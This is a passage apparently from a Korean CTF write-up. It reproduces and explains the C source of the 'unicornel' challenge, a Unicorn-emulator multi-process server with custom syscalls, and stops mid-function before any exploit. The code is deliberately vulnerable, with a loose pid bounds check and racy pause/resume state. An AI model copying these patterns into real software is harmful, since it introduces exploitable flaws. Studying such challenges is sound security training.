<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#66d9ef">int</span> <span style="color:#a6e22e">start_process</span>() 
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">pthread_mutex_lock</span>(<span style="color:#f92672">&amp;</span>task_lock);
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">int</span> pid <span style="color:#f92672">=</span> <span style="color:#a6e22e">find_free_process</span>();
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span>(pid <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">0</span>)
</span></span><span style="display:flex;"><span>  {
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;At max processes already</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">pthread_mutex_unlock</span>(<span style="color:#f92672">&amp;</span>task_lock);
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>;
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">struct</span> unicornelf process_data;
</span></span><span style="display:flex;"><span>  <span style="color:#75715e">//Signal to client that we&#39;re ready to receive process_data
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;DATA_START</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">int</span> ret <span style="color:#f92672">=</span> <span style="color:#a6e22e">read</span>(<span style="color:#ae81ff">0</span>,<span style="color:#f92672">&amp;</span>process_data,<span style="color:#66d9ef">sizeof</span>(process_data));
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span>(ret <span style="color:#f92672">!=</span> <span style="color:#66d9ef">sizeof</span>(process_data)) {
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;Unexpected read size</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">pthread_mutex_unlock</span>(<span style="color:#f92672">&amp;</span>task_lock);
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>;
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span>(<span style="color:#f92672">!</span>process_data.code_length <span style="color:#f92672">||</span> <span style="color:#f92672">!</span>process_data.num_maps <span style="color:#f92672">||</span> process_data.num_maps <span style="color:#f92672">&gt;</span> <span style="color:#ae81ff">4</span> <span style="color:#f92672">||</span> process_data.code_length <span style="color:#f92672">&gt;</span> process_data.maps[<span style="color:#ae81ff">0</span>].length)
</span></span><span style="display:flex;"><span>  {
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;Malformed process data</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">pthread_mutex_unlock</span>(<span style="color:#f92672">&amp;</span>task_lock);
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>;
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>  <span style="color:#75715e">//Only allow one process per architecture
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">if</span>(process_data.arch <span style="color:#f92672">&gt;=</span> UC_ARCH_MAX <span style="color:#f92672">||</span> process_data.arch <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">1</span> <span style="color:#f92672">||</span> arch_used[process_data.arch])
</span></span><span style="display:flex;"><span>  {
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;Invalid arch specified</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">pthread_mutex_unlock</span>(<span style="color:#f92672">&amp;</span>task_lock);
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>;
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">char</span><span style="color:#f92672">*</span> code_recv <span style="color:#f92672">=</span> <span style="color:#a6e22e">calloc</span>(<span style="color:#ae81ff">1</span>,process_data.code_length);
</span></span><span style="display:flex;"><span>  <span style="color:#75715e">//Signal to client that we&#39;re ready to receive process code
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;CODE_START</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">fflush</span>(stdout);
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">read</span>(<span style="color:#ae81ff">0</span>,code_recv,process_data.code_length);
</span></span><span style="display:flex;"><span>  uc_engine <span style="color:#f92672">*</span>uc;
</span></span><span style="display:flex;"><span>  uc_err err;
</span></span><span style="display:flex;"><span>  err <span style="color:#f92672">=</span> <span style="color:#a6e22e">uc_open</span>(process_data.arch,process_data.mode,<span style="color:#f92672">&amp;</span>uc);
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span>(err <span style="color:#f92672">!=</span> UC_ERR_OK) {
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;Failed on uc_open() %u %u with error %u</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>,process_data.arch,process_data.mode,err);
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">pthread_mutex_unlock</span>(<span style="color:#f92672">&amp;</span>task_lock);
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">free</span>(code_recv);
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>;
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">for</span>(<span style="color:#66d9ef">unsigned</span> i <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; i <span style="color:#f92672">&lt;</span> process_data.num_maps; i<span style="color:#f92672">++</span>)
</span></span><span style="display:flex;"><span>  {
</span></span><span style="display:flex;"><span>    err <span style="color:#f92672">=</span> <span style="color:#a6e22e">uc_mem_map</span>(uc,process_data.maps[i].va,process_data.maps[i].length,UC_PROT_ALL);
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span>(err <span style="color:#f92672">!=</span> UC_ERR_OK)
</span></span><span style="display:flex;"><span>    {
</span></span><span style="display:flex;"><span>      <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;Failed on uc_mem_map() with error %u</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>,err);
</span></span><span style="display:flex;"><span>      <span style="color:#a6e22e">free</span>(code_recv);
</span></span><span style="display:flex;"><span>      <span style="color:#a6e22e">uc_close</span>(uc);
</span></span><span style="display:flex;"><span>      <span style="color:#a6e22e">pthread_mutex_unlock</span>(<span style="color:#f92672">&amp;</span>task_lock);
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">return</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>;
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>  err <span style="color:#f92672">=</span> <span style="color:#a6e22e">uc_mem_write</span>(uc,process_data.maps[<span style="color:#ae81ff">0</span>].va,code_recv,process_data.code_length);
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">free</span>(code_recv);
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span>(err <span style="color:#f92672">!=</span> UC_ERR_OK)
</span></span><span style="display:flex;"><span>  {
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;failed on uc_mem_write() with error %u</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>,err);
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">uc_close</span>(uc);
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">pthread_mutex_unlock</span>(<span style="color:#f92672">&amp;</span>task_lock);
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>;
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>  uc_hook trace;
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">int</span> pipefds[<span style="color:#ae81ff">2</span>];
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">pipe</span>(pipefds);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  pfds[pid].fd <span style="color:#f92672">=</span> pipefds[<span style="color:#ae81ff">0</span>];
</span></span><span style="display:flex;"><span>  pfds[pid].events <span style="color:#f92672">=</span> POLLIN;
</span></span><span style="display:flex;"><span>  pfds[pid].revents <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">struct</span> process<span style="color:#f92672">*</span> new_process <span style="color:#f92672">=</span> <span style="color:#a6e22e">calloc</span>(<span style="color:#ae81ff">1</span>,<span style="color:#66d9ef">sizeof</span>(<span style="color:#66d9ef">struct</span> process));
</span></span><span style="display:flex;"><span>  new_process<span style="color:#f92672">-&gt;</span>pid <span style="color:#f92672">=</span> pid;
</span></span><span style="display:flex;"><span>  new_process<span style="color:#f92672">-&gt;</span>outfd <span style="color:#f92672">=</span> pipefds[<span style="color:#ae81ff">1</span>];
</span></span><span style="display:flex;"><span>  new_process<span style="color:#f92672">-&gt;</span>uc <span style="color:#f92672">=</span> uc;
</span></span><span style="display:flex;"><span>  new_process<span style="color:#f92672">-&gt;</span>arch <span style="color:#f92672">=</span> process_data.arch;
</span></span><span style="display:flex;"><span>  new_process<span style="color:#f92672">-&gt;</span>entrypoint <span style="color:#f92672">=</span> process_data.maps[<span style="color:#ae81ff">0</span>].va;
</span></span><span style="display:flex;"><span>  new_process<span style="color:#f92672">-&gt;</span>code_length <span style="color:#f92672">=</span> process_data.code_length;
</span></span><span style="display:flex;"><span>  new_process<span style="color:#f92672">-&gt;</span>bookmark <span style="color:#f92672">=</span> NULL;
</span></span><span style="display:flex;"><span>  new_process<span style="color:#f92672">-&gt;</span>sbr.va <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
</span></span><span style="display:flex;"><span>  new_process<span style="color:#f92672">-&gt;</span>sbr.unmap_on_rewind <span style="color:#f92672">=</span> false;
</span></span><span style="display:flex;"><span>  new_process<span style="color:#f92672">-&gt;</span>transition <span style="color:#f92672">=</span> false;
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">memcpy</span>(new_process<span style="color:#f92672">-&gt;</span>maps,process_data.maps,<span style="color:#66d9ef">sizeof</span>(process_data.maps));
</span></span><span style="display:flex;"><span>  new_process<span style="color:#f92672">-&gt;</span>num_maps <span style="color:#f92672">=</span> process_data.num_maps;
</span></span><span style="display:flex;"><span>  processes[pid] <span style="color:#f92672">=</span> new_process;
</span></span><span style="display:flex;"><span>  err <span style="color:#f92672">=</span> <span style="color:#a6e22e">uc_hook_add</span>(uc,<span style="color:#f92672">&amp;</span>trace,UC_HOOK_INTR,hook_call,new_process,<span style="color:#ae81ff">1</span>,<span style="color:#ae81ff">0</span>);
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span>(err <span style="color:#f92672">!=</span> UC_ERR_OK)
</span></span><span style="display:flex;"><span>  {
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;failed on uc_hook_add() with error %u</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>,err);
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">destroy_process</span>(new_process);
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">pthread_mutex_unlock</span>(<span style="color:#f92672">&amp;</span>task_lock);
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>;
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">pthread_attr_t</span> attr;
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">pthread_attr_init</span>(<span style="color:#f92672">&amp;</span>attr);
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">pthread_attr_setdetachstate</span>(<span style="color:#f92672">&amp;</span>attr, PTHREAD_CREATE_DETACHED);
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">int</span> pthread_err <span style="color:#f92672">=</span> <span style="color:#a6e22e">pthread_create</span>(<span style="color:#f92672">&amp;</span>new_process<span style="color:#f92672">-&gt;</span><span style="color:#66d9ef">thread</span>,<span style="color:#f92672">&amp;</span>attr,process_thread,new_process);
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span>(pthread_err <span style="color:#f92672">!=</span> <span style="color:#ae81ff">0</span>)
</span></span><span style="display:flex;"><span>  {
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;failed to create pthread</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">destroy_process</span>(new_process);
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">else</span> {
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;new process created with pid %d</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>,pid);
</span></span><span style="display:flex;"><span>    arch_used[process_data.arch] <span style="color:#f92672">=</span> true;
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">pthread_mutex_unlock</span>(<span style="color:#f92672">&amp;</span>task_lock);
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">return</span> pthread_err;
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>여기서 쓰레드로 병렬적으로 실행해준다.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#66d9ef">struct</span> unicornelf {
</span></span><span style="display:flex;"><span>    uc_arch arch;
</span></span><span style="display:flex;"><span>    uc_mode mode;
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">struct</span> {
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">long</span> va;
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">long</span> length;
</span></span><span style="display:flex;"><span>    } maps[<span style="color:#ae81ff">4</span>];
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">short</span> code_length;
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">char</span> num_maps;
</span></span><span style="display:flex;"><span>};
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">struct</span> buffer_ref {
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">long</span> va;
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">long</span> length;
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">unsigned</span> handle;
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">bool</span> unmap_on_rewind;
</span></span><span style="display:flex;"><span>};
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">struct</span> process {
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">pthread_t</span> <span style="color:#66d9ef">thread</span>;
</span></span><span style="display:flex;"><span>    uc_arch arch;
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">int</span> outfd;
</span></span><span style="display:flex;"><span>    uc_engine <span style="color:#f92672">*</span>uc;
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">long</span> entrypoint;
</span></span><span style="display:flex;"><span>    uc_context<span style="color:#f92672">*</span> bookmark;
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">struct</span> buffer_ref sbr;
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">struct</span> {
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">long</span> va;
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">long</span> length;
</span></span><span style="display:flex;"><span>    } maps[<span style="color:#ae81ff">4</span>];
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">short</span> code_length;
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">char</span> pid;
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">char</span> num_maps;
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">bool</span> transition;
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">bool</span> paused;
</span></span><span style="display:flex;"><span>};
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">struct</span> shared_buffer {
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">volatile</span> atomic_uint refs;
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">void</span><span style="color:#f92672">*</span> buffer;
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">unsigned</span> length;
</span></span><span style="display:flex;"><span>};
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">static</span> <span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">int</span> call_regs[UC_ARCH_MAX][<span style="color:#ae81ff">4</span>] <span style="color:#f92672">=</span> {
</span></span><span style="display:flex;"><span>    {<span style="color:#ae81ff">0</span>,<span style="color:#ae81ff">0</span>,<span style="color:#ae81ff">0</span>,<span style="color:#ae81ff">0</span>}, <span style="color:#75715e">//NONE
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    {UC_ARM_REG_R0,UC_ARM_REG_R1,UC_ARM_REG_R2,UC_ARM_REG_R3}, <span style="color:#75715e">//UC_ARCH_ARM
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    {UC_ARM64_REG_X0,UC_ARM64_REG_X1,UC_ARM64_REG_X2,UC_ARM64_REG_X3}, <span style="color:#75715e">//UC_ARCH_ARM64
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    {UC_MIPS_REG_A0,UC_MIPS_REG_A1,UC_MIPS_REG_A2,UC_MIPS_REG_A3}, <span style="color:#75715e">//UC_ARCH_MIPS
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    {UC_X86_REG_RAX,UC_X86_REG_RBX,UC_X86_REG_RCX,UC_X86_REG_RDX}, <span style="color:#75715e">//UC_ARCH_X86
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    {UC_PPC_REG_0,UC_PPC_REG_1,UC_PPC_REG_2,UC_PPC_REG_3}, <span style="color:#75715e">//UC_ARCH_PPC
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    {UC_SPARC_REG_O0,UC_SPARC_REG_O1,UC_SPARC_REG_O2,UC_SPARC_REG_O3}, <span style="color:#75715e">//UC_ARCH_SPARC
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    {UC_M68K_REG_D0,UC_M68K_REG_D1,UC_M68K_REG_D2,UC_M68K_REG_D3}, <span style="color:#75715e">//UC_ARCH_M68K
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    {UC_RISCV_REG_A0,UC_RISCV_REG_A1,UC_RISCV_REG_A2,UC_RISCV_REG_A3}, <span style="color:#75715e">//UC_ARCH_RISCV
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    {UC_S390X_REG_R0,UC_S390X_REG_R1,UC_S390X_REG_R2,UC_S390X_REG_R3}, <span style="color:#75715e">//UC_ARCH_S390X
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    {UC_TRICORE_REG_D0,UC_TRICORE_REG_D1,UC_TRICORE_REG_D2,UC_TRICORE_REG_D3}, <span style="color:#75715e">//UC_ARCH_TRICORE
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>};
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">static</span> <span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">int</span> ip_reg[UC_ARCH_MAX] <span style="color:#f92672">=</span> {
</span></span><span style="display:flex;"><span>    <span style="color:#ae81ff">0</span>,
</span></span><span style="display:flex;"><span>    UC_ARM_REG_PC,
</span></span><span style="display:flex;"><span>    UC_ARM64_REG_PC,
</span></span><span style="display:flex;"><span>    UC_MIPS_REG_PC,
</span></span><span style="display:flex;"><span>    UC_X86_REG_RIP,
</span></span><span style="display:flex;"><span>    UC_PPC_REG_PC,
</span></span><span style="display:flex;"><span>    UC_SPARC_REG_PC,
</span></span><span style="display:flex;"><span>    UC_M68K_REG_PC,
</span></span><span style="display:flex;"><span>    UC_RISCV_REG_PC,
</span></span><span style="display:flex;"><span>    UC_S390X_REG_PC,
</span></span><span style="display:flex;"><span>    UC_TRICORE_REG_PC
</span></span><span style="display:flex;"><span>};
</span></span></code></pre></div><p>여러 아키텍처들을 지원한다.
핵심 데이터 구조는 위와 같이 되어있다.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#66d9ef">long</span> (<span style="color:#f92672">*</span>syscalls[])(<span style="color:#66d9ef">struct</span> process<span style="color:#f92672">*</span> current) <span style="color:#f92672">=</span> {
</span></span><span style="display:flex;"><span>    unicornel_exit,
</span></span><span style="display:flex;"><span>    unicornel_write,
</span></span><span style="display:flex;"><span>    print_integer,
</span></span><span style="display:flex;"><span>    create_shared,
</span></span><span style="display:flex;"><span>    map_shared,
</span></span><span style="display:flex;"><span>    unmap_shared,
</span></span><span style="display:flex;"><span>    bookmark,
</span></span><span style="display:flex;"><span>    unicornel_rewind,
</span></span><span style="display:flex;"><span>    switch_arch,
</span></span><span style="display:flex;"><span>    unicornel_pause,
</span></span><span style="display:flex;"><span>    unicornel_resume
</span></span><span style="display:flex;"><span>};
</span></span></code></pre></div><p>시스템콜도 몇개 구현되어있지 않다.
syscalls.c에 시스템콜들이 모두 구현되어있다.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#66d9ef">long</span> <span style="color:#a6e22e">unicornel_pause</span>(<span style="color:#66d9ef">struct</span> process<span style="color:#f92672">*</span> current) {
</span></span><span style="display:flex;"><span>    current<span style="color:#f92672">-&gt;</span>paused <span style="color:#f92672">=</span> true;
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">while</span>(current<span style="color:#f92672">-&gt;</span>paused);
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">long</span> <span style="color:#a6e22e">unicornel_resume</span>(<span style="color:#66d9ef">struct</span> process<span style="color:#f92672">*</span> current) {
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">long</span> pid <span style="color:#f92672">=</span> <span style="color:#a6e22e">ARG_REGR</span>(current,<span style="color:#ae81ff">1</span>);
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">pthread_mutex_lock</span>(<span style="color:#f92672">&amp;</span>task_lock);
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span>(pid <span style="color:#f92672">&gt;</span> MAX_PROCESSES <span style="color:#f92672">||</span> <span style="color:#f92672">!</span>processes[pid] <span style="color:#f92672">||</span> <span style="color:#f92672">!</span>processes[pid]<span style="color:#f92672">-&gt;</span>paused)
</span></span><span style="display:flex;"><span>    {
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">pthread_mutex_unlock</span>(<span style="color:#f92672">&amp;</span>task_lock);
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>;
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>    processes[pid]<span style="color:#f92672">-&gt;</span>paused <span style="color:#f92672">=</span> false;
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">pthread_mutex_unlock</span>(<span style="color:#f92672">&amp;</span>task_lock);
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>resume &amp; pause는 다른 프로세스를 멈추고 깨우는 시스템콜이다.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#66d9ef">long</span> <span style="color:#a6e22e">switch_arch</span>(<span style="color:#66d9ef">struct</span> process<span style="color:#f92672">*</span> current) {
</span></span><span style="display:flex;"><span>    <span style="color:#75715e">//Only allow switching architectures once in order to avoid potential recursion stack overflows
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#66d9ef">if</span>(current<span style="color:#f92672">-&gt;</span>transition)
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>;
</span></span><span style="display:flex;"><span>    uc_arch arch <span style="color:#f92672">=</span> <span style="color:#a6e22e">ARG_REGR</span>(current,<span style="color:#ae81ff">1</span>);
</span></span><span style="display:flex;"><span>    uc_mode mode <span style="color:#f92672">=</span> <span style="color:#a6e22e">ARG_REGR</span>(current,<span style="color:#ae81ff">2</span>);
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">long</span> new_pc <span style="color:#f92672">=</span> <span style="color:#a6e22e">ARG_REGR</span>(current,<span style="color:#ae81ff">3</span>);
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span>(<span style="color:#f92672">!</span><span style="color:#a6e22e">uc_arch_supported</span>(arch) <span style="color:#f92672">||</span> arch_used[arch]) {
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">2</span>;
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>    uc_engine<span style="color:#f92672">*</span> new_uc;
</span></span><span style="display:flex;"><span>    uc_engine<span style="color:#f92672">*</span> og_uc <span style="color:#f92672">=</span> current<span style="color:#f92672">-&gt;</span>uc;
</span></span><span style="display:flex;"><span>    uc_arch og_arch <span style="color:#f92672">=</span> current<span style="color:#f92672">-&gt;</span>arch;
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">struct</span> buffer_ref og_sbr <span style="color:#f92672">=</span> current<span style="color:#f92672">-&gt;</span>sbr;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    uc_err e <span style="color:#f92672">=</span> <span style="color:#a6e22e">uc_open</span>(arch,mode,<span style="color:#f92672">&amp;</span>new_uc);
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span>(e <span style="color:#f92672">!=</span> UC_ERR_OK) {
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">3</span>;
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>    <span style="color:#75715e">//Add in the hook so syscalls are supported
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    uc_hook trace;
</span></span><span style="display:flex;"><span>    e <span style="color:#f92672">=</span> <span style="color:#a6e22e">uc_hook_add</span>(new_uc,<span style="color:#f92672">&amp;</span>trace,UC_HOOK_INTR,hook_call,current,<span style="color:#ae81ff">1</span>,<span style="color:#ae81ff">0</span>);
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span>(e <span style="color:#f92672">!=</span> UC_ERR_OK)
</span></span><span style="display:flex;"><span>    {
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">uc_close</span>(new_uc);
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">5</span>;
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>    <span style="color:#75715e">//Transition maps
